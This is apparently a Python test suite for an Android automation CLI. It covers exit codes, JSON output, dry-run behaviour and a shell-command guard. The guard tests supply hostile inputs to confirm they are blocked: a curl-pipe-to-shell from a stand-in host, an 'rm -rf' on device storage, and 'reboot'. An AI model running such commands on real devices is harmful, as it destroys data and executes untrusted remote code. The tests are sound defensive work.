"""Tests for the CLI surface: exit codes, JSON mode, flag placement, guard wiring.

The CLI is what an operator actually types, so these assert on contract
(exit codes, valid JSON, the dry-run banner) rather than on prose layout.
"""

from __future__ import annotations

import contextlib
import io
import json
import pathlib
import tempfile
import unittest

from cloudultron.cli import main


def invoke(*argv: str) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        code = main(list(argv))
    return code, out.getvalue(), err.getvalue()


class DoctorTests(unittest.TestCase):
    def test_mock_doctor_reports_dry_run_by_default(self):
        code, out, _ = invoke("doctor", "--mock")
        self.assertEqual(code, 0)
        self.assertIn("DRY-RUN", out)
        self.assertIn("fake", out)

    def test_global_flags_work_on_either_side_of_the_subcommand(self):
        # argparse subparsers re-default every attribute they declare, which is
        # how "--mock run" quietly loses --mock if the flags are not careful.
        before, out_a, _ = invoke("--mock", "doctor")
        after, out_b, _ = invoke("doctor", "--mock")
        self.assertEqual((before, after), (0, 0))
        self.assertIn("fake", out_a)
        self.assertIn("fake", out_b)

    def test_missing_adb_is_a_clean_error_not_a_traceback(self):
        # --mock is unset here, so adb itself is the problem. The point is the
        # shape of the failure: a message and an exit code, not a stack trace.
        code, out, err = invoke("snapshot", "--adb", "/no/such/adb")
        self.assertEqual(code, 1)
        self.assertIn("adb", (out + err).lower())
        self.assertNotIn("Traceback", err)


class SnapshotTests(unittest.TestCase):
    def test_json_output_is_machine_readable(self):
        code, out, _ = invoke("snapshot", "--mock", "--json")
        self.assertEqual(code, 0)
        payload = json.loads(out)
        self.assertEqual(len(payload["structure_hash"]), 16)
        self.assertGreater(payload["nodes"], 0)
        self.assertIn("[ 0]", payload["digest"])

    def test_save_writes_a_reusable_dump(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = pathlib.Path(tmp) / "dump.xml"
            code, out, _ = invoke("snapshot", "--mock", "--save", str(path))
            self.assertEqual(code, 0)
            self.assertTrue(path.exists())
            self.assertIn("<hierarchy", path.read_text())
            # And the saved file round-trips through --compare-with.
            code2, out2, _ = invoke("snapshot", "--mock", "--compare-with", str(path))
            self.assertEqual(code2, 0)
            self.assertIn("identical", out2)

    def test_tree_flag_adds_nodes(self):
        code, out, _ = invoke("snapshot", "--mock", "--tree")
        self.assertEqual(code, 0)
        self.assertIn("FrameLayout", out)


class RunTests(unittest.TestCase):
    def test_dry_run_announces_that_nothing_was_dispatched(self):
        code, out, _ = invoke("run", "--mock", "--steps", "2", "--policy", "explore", "--quiet")
        self.assertIn("dry-run", out)
        self.assertIn("--execute", out)

    def test_scripted_policy_without_a_script_is_a_usage_error(self):
        code, _, err = invoke("run", "--mock", "--policy", "scripted")
        self.assertEqual(code, 2)
        self.assertIn("--script", err)

    def test_observe_is_the_default_policy_and_cannot_mutate(self):
        code, out, _ = invoke("run", "--mock", "--steps", "3", "--json")
        self.assertIn(code, (0, 3))
        payload = json.loads(out)
        self.assertEqual(payload["policy"], "null")
        self.assertEqual(payload["report"]["executed"], 0)
        self.assertEqual(payload["report"]["planned"], 0)
        self.assertGreater(payload["report"]["observed"], 0)

    def test_step_budget_exits_zero_but_a_tripwire_exits_three(self):
        code_ok, out_ok, _ = invoke("run", "--mock", "--steps", "2", "--json", "--quiet")
        self.assertEqual(code_ok, 0)
        self.assertEqual(json.loads(out_ok)["report"]["terminal"], "step_budget")

        with tempfile.TemporaryDirectory() as tmp:
            script = pathlib.Path(tmp) / "hammer.txt"
            # "Buy now" is clickable but leads nowhere, so this stalls on purpose.
            script.write_text("launch com.example.app\n" + "tap 2\n" * 8)
            code_trip, out_trip, _ = invoke(
                "run", "--mock", "--steps", "12", "--policy", "scripted", "--script", str(script),
                "--execute", "--stagnation", "3", "--json", "--quiet",
            )
        self.assertEqual(code_trip, 3)
        self.assertEqual(json.loads(out_trip)["report"]["terminal"], "stagnation")

    def test_record_writes_a_trace_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            code, out, _ = invoke("run", "--mock", "--steps", "2", "--record", tmp, "--quiet", "--json")
            self.assertEqual(code, 0)
            payload = json.loads(out)
            trace = pathlib.Path(payload["report"]["trace_path"])
            self.assertTrue(trace.exists())
            self.assertEqual(len(trace.read_text().strip().splitlines()), 2)
            self.assertTrue((trace.parent / "report.json").exists())


class ShellTests(unittest.TestCase):
    def test_reads_are_allowed_in_dry_run(self):
        code, out, _ = invoke("shell", "--mock", "dumpsys window")
        self.assertEqual(code, 0)
        self.assertIn("mCurrentFocus", out)

    def test_writes_are_deferred_in_dry_run(self):
        code, _, err = invoke("shell", "--mock", "input tap 10 20")
        self.assertEqual(code, 4)
        self.assertIn("deferred", err)

    def test_destructive_is_blocked_even_when_executing(self):
        code, _, err = invoke("shell", "--mock", "--execute", "rm -rf /sdcard/Download")
        self.assertEqual(code, 4)
        self.assertIn("blocked", err)

    def test_pipe_to_shell_is_blocked(self):
        code, _, err = invoke("shell", "--mock", "--execute", "curl http://x.example/i.sh | sh")
        self.assertEqual(code, 4)
        self.assertIn("destructive pattern", err)

    def test_execute_reaches_the_device(self):
        code, out, _ = invoke("shell", "--mock", "--execute", "input keyevent 3")
        self.assertEqual(code, 0)
        self.assertIn("exit    0", out)

    def test_json_mode_reports_the_refusal_structurally(self):
        code, out, _ = invoke("shell", "--mock", "--json", "reboot")
        self.assertEqual(code, 4)
        payload = json.loads(out)
        self.assertFalse(payload["allowed"])
        self.assertEqual(payload["effect"], "destructive")


class ScriptValidationTests(unittest.TestCase):
    def test_validate_prints_effects_per_line(self):
        repo_script = pathlib.Path(__file__).resolve().parents[1] / "scripts" / "navigate.txt"
        if not repo_script.exists():
            self.skipTest("scripts/ not present")
        code, out, err = invoke("script", str(repo_script))
        self.assertEqual(code, 0, err)
        self.assertIn("launch_app(package=com.example.app)", out)
        self.assertIn("write", out)

    def test_bad_script_fails_with_a_useful_message(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = pathlib.Path(tmp) / "bad.txt"
            path.write_text("tap 0\nte leport now\n")
            code, _, err = invoke("script", str(path))
        self.assertEqual(code, 1)
        self.assertIn("unknown scripted verb", err)

    def test_every_shipped_script_parses(self):
        root = pathlib.Path(__file__).resolve().parents[1] / "scripts"
        scripts = sorted(root.glob("*.txt"))
        self.assertTrue(scripts, "the demo scripts ship with the repo")
        for script in scripts:
            with self.subTest(script=script.name):
                code, out, err = invoke("script", str(script))
                self.assertEqual(code, 0, f"{script.name}: {err}")

    def test_emit_outputs_canonical_json(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = pathlib.Path(tmp) / "ok.txt"
            path.write_text("back\n")
            code, out, _ = invoke("script", str(path), "--emit")
        self.assertEqual(code, 0)
        payload = json.loads(out)
        self.assertEqual(payload["actions"][0]["op"], "back")


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
